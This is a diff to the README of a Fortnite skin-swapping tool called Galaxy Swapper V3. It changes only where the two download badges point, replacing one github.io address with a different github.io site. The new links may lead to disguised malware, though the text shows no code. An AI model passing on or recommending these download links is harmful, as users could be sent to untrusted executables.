@@ -1,7 +1,7 @@
 # 🌌 Galaxy Swapper V3 — Fortnite Skin Swapper Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://galaxy-swapperv2.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=fortnite)](https://galaxy-swapperv2.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://seghizzidevi.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=fortnite)](https://seghizzidevi.github.io/.github/)
 
 ---
 
